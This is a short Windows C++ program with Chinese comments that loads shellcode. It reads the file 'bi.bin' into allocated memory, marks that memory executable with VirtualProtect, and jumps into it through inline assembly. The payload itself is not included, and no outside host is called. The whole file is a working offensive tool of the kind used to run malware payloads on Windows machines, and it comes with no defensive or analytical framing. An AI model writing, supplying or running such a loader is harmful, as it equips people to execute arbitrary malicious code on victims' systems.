#include <Windows.h>
#include <iostream>

using namespace std;

int main()
{
    LPCSTR ShellcodeFile = "bi.bin";//被加载的Shellcode文件

    // 打开文件
    HANDLE hFile = CreateFileA(ShellcodeFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        cout << "打开文件失败!" << endl;
        return 1;
    }

    // 获取文件大小
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        CloseHandle(hFile);
        cout << "无法读取文件大小 也许占用中?" << endl;
        return 1;
    }

    // 读取文件内容
    LPVOID lpFileContent = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwBytesRead = 0;
    BOOL bResult = ReadFile(hFile, lpFileContent, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);
    if (!bResult || dwBytesRead != dwFileSize)
    {
        VirtualFree(lpFileContent, 0, MEM_RELEASE);
        cout << "读文件失败!" << endl;
        return 1;
    }

    DWORD dwOldProtect;
    VirtualProtect(lpFileContent, dwFileSize, PAGE_EXECUTE_READ, &dwOldProtect);

    // 执行Shellcode
    __asm
    {
        mov eax, lpFileContent
        call eax
    }

    VirtualFree(lpFileContent, 0, MEM_RELEASE);
    return 0;
}